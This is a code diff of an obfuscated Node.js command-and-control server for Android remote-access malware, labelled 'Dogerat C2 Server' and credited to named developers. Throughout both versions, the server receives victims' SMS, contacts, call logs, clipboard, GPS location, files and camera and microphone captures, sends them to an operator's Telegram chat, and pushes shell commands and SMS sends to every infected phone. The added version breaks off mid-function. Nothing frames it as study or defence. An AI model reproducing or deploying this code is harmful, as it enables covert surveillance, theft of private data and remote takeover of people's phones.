@@ -1,572 +1,971 @@
-const WebSocket = require("ws");
-const TelegramBot = require("node-telegram-bot-api");
-const express = require("express");
-const multer = require("multer");
-const path = require("path");
-const fs = require("fs");
-require("dotenv").config();
-
-const appServer = express();
-const appSocket = new WebSocket.Server({ noServer: true });
-const appBot = new TelegramBot(process.env.TOKEN, { polling: true });
-const app = express();
-const upload = multer({ dest: "uploads/" });
-let appClients = new Map();
-let id = process.env.ID;
-let currentUuid = null;
-let currentNumber = null;
-let currentTitle = null;
-let currentPath = "/"; // File manager current path
-let fileManagerState = new Map(); // Track file manager sessions per device
-
-app.use(express.static("public"));
-app.use(express.json({ limit: "50mb" }));
-app.use("/uploads", express.static("uploads"));
-
-// File Manager State Management
-function getFileManagerKeyboard(uuid, path) {
-  return {
-    inline_keyboard: [
-      [{ text: `📁 Back to ${path.split('/').slice(0,-1).join('/') || '/' }`, callback_data: `fm_back:${uuid}:${path}` }],
-      [{ text: `📂 Refresh`, callback_data: `fm_refresh:${uuid}:${path}` }],
-      [{ text: `📱 Home`, callback_data: `fm_home:${uuid}` }]
-    ]
-  };
-}
-
-// Cleanup old uploads
-setInterval(() => {
-  fs.readdir("uploads", (err, files) => {
-    files.forEach(file => {
-      fs.unlink(`uploads/${file}`, () => {});
-    });
-  });
-}, 300000);
-
-app.post("/upload", upload.single("file"), (req, res) => {
-  res.json({ status: "ok", file: req.file.filename });
-});
-
-app.post("/text", express.raw({ type: "*/*", limit: "10mb" }), (req, res) => {
-  const uuid = req.headers["x-uuid"];
-  const client = appClients.get(uuid);
-  if (client) {
-    appBot.sendMessage(id, `📄 <b>Text from ${client.model}</b>\n\n${req.body.toString()}`, { parse_mode: "HTML" });
-  }
-  res.json({ status: "ok" });
-});
-
-app.post("/location", express.json(), (req, res) => {
-  const uuid = req.headers["x-uuid"];
-  const client = appClients.get(uuid);
-  if (client) {
-    appBot.sendLocation(id, req.body.latitude, req.body.longitude, null, {
-      reply_markup: {
-        inline_keyboard: [[{ text: "🗺️ Open Maps", url: `https://maps.google.com/?q=${req.body.latitude},${req.body.longitude}` }]]
-      }
-    });
-  }
-  res.json({ status: "ok" });
-});
-
-// WebSocket Connection
-appServer.on("upgrade", function(request, socket, head) {
-  appSocket.handleUpgrade(request, socket, head, function(_0x4d0a4e) {
-    const uuid = Date.now().toString();
-    _0x4d0a4e.uuid = uuid;
-    appSocket.clients.forEach(function(_0x2d1f4e) {
-      if (_0x2d1f4e.readyState === WebSocket.OPEN) {
-        _0x2d1f4e.send(JSON.stringify({ type: "connected_devices", count: appSocket.clients.size }));
-      }
-    });
-    appBot.sendMessage(id, "°• 𝙉𝙚𝙬 𝘿𝙚𝙫𝙞𝙘𝙚 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 ✅\n\n• ʏᴏᴜʀ ᴛᴏᴛᴀʟ ᴅᴇᴠɪᴄᴇꜱ: <b>" + appSocket.clients.size + "</b>", {
-      "parse_mode": "HTML",
-      "reply_markup": {
-        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-        "resize_keyboard": true
-      }
-    });
-    _0x4d0a4e.on("message", function(_0x2c2f44) {
-      try {
-        const data = JSON.parse(_0x2c2f44);
-        if (data.type === "init") {
-          appClients.set(uuid, data);
-          let devicesList = "";
-          appClients.forEach((_0x1c6e24, _0x1f4e2a) => {
-            devicesList += `• <b>${_0x1c6e24.model}</b> (${_0x1c6e24.androidVersion})\n`;
-          });
-          appBot.sendMessage(id, `📱 <b>Connected Devices (${appClients.size}):</b>\n\n${devicesList}`, { parse_mode: "HTML" });
-        } else if (data.type === "response") {
-          const client = appClients.get(uuid);
-          if (client) {
-            appBot.sendDocument(id, Buffer.from(data.data), {
-              caption: `📱 Response from <b>${client.model}</b>\n\n${data.message || ""}`,
-              parse_mode: "HTML"
-            });
-          }
-        } else if (data.type === "file_list") {
-          // File Manager Response
-          handleFileList(uuid, data.path, data.files);
-        }
-      } catch (e) {
-        const message = _0x2c2f44.toString();
-        const parts = message.split(":");
-        if (parts[0] === "apps") {
-          const client = appClients.get(uuid);
-          appBot.sendMessage(id, `📱 <b>Installed Apps (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
-        } else if (parts[0] === "device_info") {
-          const client = appClients.get(uuid);
-          appBot.sendMessage(id, `ℹ️ <b>Device Info (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
-        } else if (parts[0] === "clipboard") {
-          const client = appClients.get(uuid);
-          appBot.sendMessage(id, `📋 <b>Clipboard (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
-        } else if (parts[0] === "contacts") {
-          const client = appClients.get(uuid);
-          appBot.sendMessage(id, `📞 <b>Contacts (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
-        } else if (parts[0] === "calls") {
-          const client = appClients.get(uuid);
-          appBot.sendMessage(id, `📲 <b>Call Logs (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
-        } else if (parts[0] === "messages") {
-          const client = appClients.get(uuid);
-          appBot.sendMessage(id, `💬 <b>SMS (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
-        }
-      }
-    });
-    _0x4d0a4e.on("close", function() {
-      appClients.delete(uuid);
-      appSocket.clients.forEach(function(_0x4e2d1f) {
-        if (_0x4e2d1f.readyState === WebSocket.OPEN) {
-          _0x4e2d1f.send(JSON.stringify({ type: "connected_devices", count: appSocket.clients.size }));
-        }
-      });
-      appBot.sendMessage(id, "°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝘿𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 ❌\n\n• 𝙔𝙤𝙪𝙧 𝙩𝙤𝙩𝙖𝙡 𝙙𝙚𝙫𝙞𝙘𝙚𝙨: <b>" + appSocket.clients.size + "</b>", {
-        "parse_mode": "HTML",
-        "reply_markup": {
-          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-          "resize_keyboard": true
-        }
-      });
-    });
-  });
-});
-
-// File Manager Handler
-function handleFileList(uuid, path, files) {
-  const client = appClients.get(uuid);
-  if (!client) return;
-
-  let keyboard = [];
-  let text = `📁 <b>File Manager - ${client.model}</b>\n\n`;
-  text += `📍 <b>Current Path:</b> <code>${path}</code>\n\n`;
-
-  files.forEach(file => {
-    const size = file.isDir ? "📁 Folder" : `📄 ${formatFileSize(file.size)}`;
-    const emoji = file.isDir ? "📁" : getFileEmoji(file.name);
-    
-    text += `${emoji} <code>${file.name}</code> ${size}\n`;
-    
-    if (file.isDir) {
-      keyboard.push([{ text: `${emoji} ${file.name}`, callback_data: `fm_open:${uuid}:${path}/${file.name}` }]);
-    } else {
-      keyboard.push([{ text: `${emoji} ${file.name} (${formatFileSize(file.size)})`, callback_data: `fm_download:${uuid}:${path}/${file.name}` }]);
-    }
-  });
-
-  // Add navigation buttons
-  keyboard.push([{ text: "↩️ Back", callback_data: `fm_back:${uuid}:${path}` }]);
-  keyboard.push([{ text: "🏠 Home", callback_data: `fm_home:${uuid}` }]);
-  keyboard.push([{ text: "🔄 Refresh", callback_data: `fm_refresh:${uuid}:${path}` }]);
-
-  appBot.sendMessage(id, text, {
-    parse_mode: "HTML",
-    reply_markup: { inline_keyboard: keyboard.slice(0, 10) } // Telegram limit
-  });
-}
-
-function formatFileSize(bytes) {
-  if (bytes === 0) return '0 Bytes';
-  const k = 1024;
-  const sizes = ['Bytes', 'KB', 'MB', 'GB'];
-  const i = Math.floor(Math.log(bytes) / Math.log(k));
-  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
-}
-
-function getFileEmoji(filename) {
-  const ext = path.extname(filename).toLowerCase();
-  const icons = {
-    '.jpg': '🖼️', '.jpeg': '🖼️', '.png': '🖼️', '.gif': '🖼️',
-    '.mp4': '🎥', '.avi': '🎥', '.mkv': '🎥',
-    '.mp3': '🎵', '.wav': '🎵', '.flac': '🎵',
-    '.pdf': '📄', '.doc': '📄', '.txt': '📄',
-    '.apk': '📱'
-  };
-  return icons[ext] || '📄';
-}
-
-// Continue with bot handlers in PART 2...
-appBot.on("callback_query", _0x425827 => {
-  const _0x440ba5 = _0x425827.message;
-  const _0x9f09ec = _0x425827.data;
-  const _0x2f3f8b = _0x9f09ec.split(":")[0];
-  const _0x39894d = _0x9f09ec.split(":")[1]; // UUID
-  
-  // 🔥 NEW FEATURE 1: FILE MANAGER
-  if (_0x2f3f8b === "file_manager") {
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) {
-        client.send("file_manager:/"); // Start from root
-      }
-    });
-    appBot.answerCallbackQuery(_0x425827.id, "📁 Loading file manager...");
-    appBot.deleteMessage(id, _0x440ba5.message_id);
-  }
-
-  // 🔥 NEW FEATURE 2: NOTIFICATION CONTROL
-  if (_0x2f3f8b === "notification_off") {
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) {
-        client.send("notification_off");
-      }
-    });
-    appBot.answerCallbackQuery(_0x425827.id, "🔇 Notifications OFF");
-    appBot.editMessageText(`✅ <b>Notifications Disabled</b> on ${_0x39894d}`, {
-      chat_id: id,
-      message_id: _0x440ba5.message_id,
-      parse_mode: "HTML"
-    });
-  }
-
-  if (_0x2f3f8b === "notification_on") {
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) {
-        client.send("notification_on");
-      }
-    });
-    appBot.answerCallbackQuery(_0x425827.id, "🔔 Notifications ON");
-    appBot.editMessageText(`✅ <b>Notifications Enabled</b> on ${_0x39894d}`, {
-      chat_id: id,
-      message_id: _0x440ba5.message_id,
-      parse_mode: "HTML"
-    });
-  }
-
-  // 🔥 FILE MANAGER NAVIGATION
-  if (_0x2f3f8b === "fm_open") {
-    const path = _0x9f09ec.split(":")[2];
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) {
-        client.send(`file_manager:${path}`);
-      }
-    });
-    appBot.answerCallbackQuery(_0x425827.id, `📁 Opening ${path}`);
-  }
-
-  if (_0x2f3f8b === "fm_download") {
-    const path = _0x9f09ec.split(":")[2];
-    const client = appClients.get(_0x39894d);
-    appBot.answerCallbackQuery(_0x425827.id, `📥 Downloading ${path}`);
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) {
-        client.send(`file:${path}`);
-      }
-    });
-    appBot.editMessageText(`📥 <b>Downloading:</b> <code>${path}</code>\n\nDevice: ${client.model}`, {
-      chat_id: id,
-      message_id: _0x440ba5.message_id,
-      parse_mode: "HTML"
-    });
-  }
-
-  if (_0x2f3f8b === "fm_back") {
-    const path = _0x9f09ec.split(":")[2];
-    const parentPath = path.split('/').slice(0, -1).join('/') || '/';
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) {
-        client.send(`file_manager:${parentPath}`);
-      }
-    });
-    appBot.answerCallbackQuery(_0x425827.id, "↩️ Going back...");
-  }
-
-  if (_0x2f3f8b === "fm_home") {
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) {
-        client.send("file_manager:/");
-      }
-    });
-    appBot.answerCallbackQuery(_0x425827.id, "🏠 Going home...");
-  }
-
-  if (_0x2f3f8b === "fm_refresh") {
-    const path = _0x9f09ec.split(":")[2];
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) {
-        client.send(`file_manager:${path}`);
-      }
-    });
-    appBot.answerCallbackQuery(_0x425827.id, "🔄 Refreshing...");
-  }
-
-  // ORIGINAL DEVICE MENU (Updated with NEW buttons)
-  if (_0x2f3f8b === "device") {
-    const client = appClients.get(_0x39894d);
-    appBot.editMessageText("°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>" + (client?.model || _0x39894d) + "</b>", {
-      chat_id: id,
-      message_id: _0x440ba5.message_id,
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "📱 𝘼𝙥𝙥𝙨", callback_data: "apps:" + _0x39894d }, 
-           { text: "ℹ️ 𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤", callback_data: "device_info:" + _0x39894d }],
-          
-          [{ text: "🗂️ 𝗙𝗜𝗟𝗘 𝗠𝗔𝗡𝗔𝗚𝗘𝗥", callback_data: "file_manager:" + _0x39894d }, 
-           { text: "🔔 𝗧𝗢𝗚𝗚𝗟𝗘 𝗡𝗢𝗧𝗜𝗙", callback_data: "notification_toggle:" + _0x39894d }],
-          
-          [{ text: "📁 𝙂𝙚𝙩 𝙛𝙞𝙡𝙚", callback_data: "file:" + _0x39894d }, 
-           { text: "🗑️ 𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚", callback_data: "delete_file:" + _0x39894d }],
-          
-          [{ text: "📋 𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙", callback_data: "clipboard:" + _0x39894d }, 
-           { text: "🎤 𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚", callback_data: "microphone:" + _0x39894d }],
-          
-          [{ text: "📷 𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖", callback_data: "camera_main:" + _0x39894d }, 
-           { text: "🤳 𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖", callback_data: "camera_selfie:" + _0x39894d }],
-          
-          [{ text: "📍 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣", callback_data: "location:" + _0x39894d }, 
-           { text: "🍞 𝙏𝙤𝙖𝙨𝙩", callback_data: "toast:" + _0x39894d }],
-          
-          [{ text: "📞 𝘾𝙖𝙡𝙡𝙨", callback_data: "calls:" + _0x39894d }, 
-           { text: "👥 𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨", callback_data: "contacts:" + _0x39894d }],
-          
-          [{ text: "📳 𝙑𝙞𝙗𝙧𝙖𝙩𝙚", callback_data: "vibrate:" + _0x39894d }, 
-           { text: "🔔 𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣", callback_data: "show_notification:" + _0x39894d }],
-          
-          [{ text: "💬 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨", callback_data: "messages:" + _0x39894d }, 
-           { text: "📤 𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚", callback_data: "send_message:" + _0x39894d }],
-          
-          [{ text: "🎵 𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤", callback_data: "play_audio:" + _0x39894d }, 
-           { text: "⏹️ 𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤", callback_data: "stop_audio:" + _0x39894d }],
-          
-          [{ text: "📨 𝙎𝙚𝙣𝙙 𝙩𝙤 𝘼𝙇𝙇 𝘾𝙊𝙉𝙏𝘼𝘾𝙏𝙎", callback_data: "send_message_to_all:" + _0x39894d }]
-        ]
-      },
-      parse_mode: "HTML"
-    });
-    return;
-  }
-
-  // Notification Toggle (shows OFF/ON buttons)
-  if (_0x2f3f8b === "notification_toggle") {
-    appBot.editMessageText("🔔 <b>Notification Control</b>", {
-      chat_id: id,
-      message_id: _0x440ba5.message_id,
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "🔇 𝗢𝗙𝗙", callback_data: "notification_off:" + _0x39894d }],
-          [{ text: "🔔 𝗢𝗡", callback_data: "notification_on:" + _0x39894d }]
-        ]
-      },
-      parse_mode: "HTML"
-    });
-    return;
-  }
-
-  // Continue with all original handlers...
-  if (_0x2f3f8b === "calls") {
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) client.send("calls");
-    });
-    appBot.deleteMessage(id, _0x440ba5.message_id);
-    sendProcessingMessage();
-  }
-
-  if (_0x2f3f8b === "contacts") {
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) client.send("contacts");
-    });
-    appBot.deleteMessage(id, _0x440ba5.message_id);
-    sendProcessingMessage();
-  }
-
-  if (_0x2f3f8b === "messages") {
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) client.send("messages");
-    });
-    appBot.deleteMessage(id, _0x440ba5.message_id);
-    sendProcessingMessage();
-  }
-
-  if (_0x2f3f8b === "apps") {
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) client.send("apps");
-    });
-    appBot.deleteMessage(id, _0x440ba5.message_id);
-    sendProcessingMessage();
-  }
-
-  if (_0x2f3f8b === "device_info") {
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) client.send("device_info");
-    });
-    appBot.deleteMessage(id, _0x440ba5.message_id);
-    sendProcessingMessage();
-  }
-
-  if (_0x2f3f8b === "clipboard") {
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) client.send("clipboard");
-    });
-    appBot.deleteMessage(id, _0x440ba5.message_id);
-    sendProcessingMessage();
-  }
-
-  // Continue with camera, location, etc. handlers (same as original)...
-  if (_0x2f3f8b === "camera_main") {
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) client.send("camera_main");
-    });
-    appBot.deleteMessage(id, _0x440ba5.message_id);
-    sendProcessingMessage();
-  }
-
-  if (_0x2f3f8b === "camera_selfie") {
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) client.send("camera_selfie");
-    });
-    appBot.deleteMessage(id, _0x440ba5.message_id);
-    sendProcessingMessage();
-  }
-
-  if (_0x2f3f8b === "location") {
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) client.send("location");
-    });
-    appBot.deleteMessage(id, _0x440ba5.message_id);
-    sendProcessingMessage();
-  }
-
-  if (_0x2f3f8b === "vibrate") {
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) client.send("vibrate");
-    });
-    appBot.deleteMessage(id, _0x440ba5.message_id);
-    sendProcessingMessage();
-  }
-
-  if (_0x2f3f8b === "stop_audio") {
-    appSocket.clients.forEach(client => {
-      if (client.uuid === _0x39894d) client.send("stop_audio");
-    });
-    appBot.deleteMessage(id, _0x440ba5.message_id);
-    sendProcessingMessage();
-  }
-
-  // Input handlers (unchanged)
-  if (_0x2f3f8b === "send_message") {
-    appBot.deleteMessage(id, _0x440ba5.message_id);
-    appBot.sendMessage(id, "°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎", {
-      reply_markup: { force_reply: true }
-    });
-    currentUuid = _0x39894d;
-  }
-
-  // ... (all other input handlers remain same)
-});
-
-function sendProcessingMessage() {
-  appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {
-    parse_mode: "HTML",
-    reply_markup: {
-      keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-      resize_keyboard: true
-    }
-  });
-}
-// Message Handlers (Complete)
-appBot.on("message", _0x4e5c2a => {
-  const _0x1b3f4d = _0x4e5c2a.text;
-  const _0x2a8f6b = _0x4e5c2a.message_id;
-  
-  if (_0x4e5c2a.reply_to_message) {
-    if (currentUuid) {
-      appSocket.clients.forEach(client => {
-        if (client.uuid === currentUuid) {
-          client.send("sms:" + _0x4e5c2a.reply_to_message.text + ":" + _0x1b3f4d);
-        }
-      });
-      appBot.deleteMessage(id, _0x4e5c2a.message_id);
-      appBot.deleteMessage(id, _0x4e5c2a.reply_to_message.message_id);
-      sendProcessingMessage();
-    }
-    return;
-  }
-
-  if (_0x1b3f4d.includes("𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨")) {
-    let _0x4b2e1f = "📱 <b>Connected Devices:</b>\n\n";
-    let _0x3d8f2a = [];
-    appClients.forEach((client, uuid) => {
-      _0x4b2e1f += `• <code>${uuid}</code> - ${client.model}\n`;
-      _0x3d8f2a.push({ text: client.model, callback_data: "device:" + uuid });
-    });
-    _0x4b2e1f += `\n<b>Total: ${appClients.size}</b>`;
-    
-    const inlineKeyboard = [];
-    for (let i = 0; i < _0x3d8f2a.length; i += 2) {
-      inlineKeyboard.push(_0x3d8f2a.slice(i, i + 2));
-    }
-    
-    appBot.sendMessage(id, _0x4b2e1f, {
-      parse_mode: "HTML",
-      reply_markup: { inline_keyboard: inlineKeyboard }
-    });
-    appBot.deleteMessage(id, _0x4e5c2a.message_id);
-    return;
-  }
-
-  if (_0x1b3f4d.includes("𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙")) {
-    appBot.sendMessage(id, "°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚", {
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "🐚 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙎𝙝𝙚𝙡𝙡", callback_data: "cmdshell" },
-          { text: "📱 𝘼𝙡𝙡 𝘿𝙚𝙫𝙞𝙘𝙚𝙨", callback_data: "all_devices" }
-        ]]
-      }
-    });
-    appBot.deleteMessage(id, _0x4e5c2a.message_id);
-    return;
-  }
-
-  // Execute command on ALL devices
-  appSocket.clients.forEach(client => {
-    client.send("cmd:" + _0x1b3f4d);
-  });
-  
-  appBot.sendMessage(id, `°• 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙚𝙭𝙚𝙘𝙪𝙩𝙚𝙙 𝙤𝙣 𝘼𝙇𝙇 𝙙𝙚𝙫𝙞𝙘𝙚𝙨:\n\n<code>${_0x1b3f4d}</code>`, {
-    parse_mode: "HTML",
-    reply_markup: {
-      keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-      resize_keyboard: true
-    }
-  });
-  appBot.deleteMessage(id, _0x4e5c2a.message_id);
-});
-
-// Utility Functions
-function sendProcessingMessage() {
-  appBot.sendMessage(id, "⏳ <b>Processing request...</b>", {
-    reply_markup: {
-      keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-      resize_keyboard: true
+const express = require('express'),
+  webSocket = require('ws'),
+  http = require('http'),
+  telegramBot = require('node-telegram-bot-api'),
+  uuid4 = require('uuid'),
+  multer = require('multer'),
+  bodyParser = require('body-parser'),
+  axios = require('axios')
+require('dotenv').config()
+const token = process.env.TOKEN,
+  id = process.env.ID,
+  address = 'https://www.google.com',
+  app = express(),
+  appServer = http.createServer(app),
+  appSocket = new webSocket.Server({ server: appServer }),
+  appBot = new telegramBot(token, { polling: true }),
+  appClients = new Map(),
+  upload = multer()
+app.use(bodyParser.json())
+let currentUuid = '',
+  currentNumber = '',
+  currentTitle = ''
+app.get('/', function (_0x1b89da, _0x3398a0) {
+  _0x3398a0.send(
+    '<h1 align="center">\uD835\uDE4E\uD835\uDE5A\uD835\uDE67\uD835\uDE6B\uD835\uDE5A\uD835\uDE67 \uD835\uDE6A\uD835\uDE65\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59\uD835\uDE5A\uD835\uDE59 \uD835\uDE68\uD835\uDE6A\uD835\uDE58\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE5B\uD835\uDE6A\uD835\uDE61\uD835\uDE61\uD835\uDE6E</h1>'
+  )
+})
+app.post('/uploadFile', upload.single('file'), (_0x1c67cf, _0x143a37) => {
+  const _0x404b56 = _0x1c67cf.file.originalname
+  appBot.sendDocument(
+    id,
+    _0x1c67cf.file.buffer,
+    {
+      caption:
+        '\xB0\u2022 \uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
+        _0x1c67cf.headers.model +
+        '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A',
+      parse_mode: 'HTML',
     },
-    parse_mode: "HTML"
-  });
-}
-
-// Server Start
-const server = app.listen(80, () => {
-  console.log("🚀 Dogerat C2 Server Started on Port 80");
-});
-
-// Cleanup on exit
-process.on('SIGINT', () => {
-  server.close();
-  process.exit();
-});
+    {
+      filename: _0x404b56,
+      contentType: 'application/txt',
+    }
+  )
+  _0x143a37.send('')
+})
+app.post('/uploadText', (_0x5a02f5, _0x55205a) => {
+  appBot.sendMessage(
+    id,
+    '\xB0\u2022 \uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
+      _0x5a02f5.headers.model +
+      '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\n\n' +
+      _0x5a02f5.body.text,
+    { parse_mode: 'HTML' }
+  )
+  _0x55205a.send('')
+})
+app.post('/uploadLocation', (_0xfc380d, _0x48b391) => {
+  appBot.sendLocation(id, _0xfc380d.body.lat, _0xfc380d.body.lon)
+  appBot.sendMessage(
+    id,
+    '\xB0\u2022 \uD835\uDE47\uD835\uDE64\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63 \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
+      _0xfc380d.headers.model +
+      '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A',
+    { parse_mode: 'HTML' }
+  )
+  _0x48b391.send('')
+})
+appSocket.on('connection', (_0x466cd0, _0x1cf0ae) => {
+  const _0x275c2d = uuid4.v4(),
+    _0x2cfd1d = _0x1cf0ae.headers.model,
+    _0x5409ca = _0x1cf0ae.headers.battery,
+    _0x4a1a34 = _0x1cf0ae.headers.version,
+    _0x340b05 = _0x1cf0ae.headers.brightness,
+    _0x1dd883 = _0x1cf0ae.headers.provider
+  _0x466cd0.uuid = _0x275c2d
+  appClients.set(_0x275c2d, {
+    model: _0x2cfd1d,
+    battery: _0x5409ca,
+    version: _0x4a1a34,
+    brightness: _0x340b05,
+    provider: _0x1dd883,
+  })
+  appBot.sendMessage(
+    id,
+    '\xB0\u2022 NEW DEVICE IS CONNECTED, DEVELOPED BY @MOGATEAM & @shivayadavv\n\n' +
+      ('\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>' + _0x2cfd1d + '</b>\n') +
+      ('\u2022 ʙᴀᴛᴛᴇʀʏ : <b>' + _0x5409ca + '</b>\n') +
+      ('\u2022 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>' + _0x4a1a34 + '</b>\n') +
+      ('\u2022 ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>' + _0x340b05 + '</b>\n') +
+      ('\u2022 ᴘʀᴏᴠɪᴅᴇʀ : <b>' + _0x1dd883 + '</b>'),
+    { parse_mode: 'HTML' }
+  )
+  _0x466cd0.on('close', function () {
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE3F\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A \uD835\uDE59\uD835\uDE5E\uD835\uDE68\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59, DEVELOPED BY @MOGATEAM & @shivayadavv\n\n' +
+        ('\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>' + _0x2cfd1d + '</b>\n') +
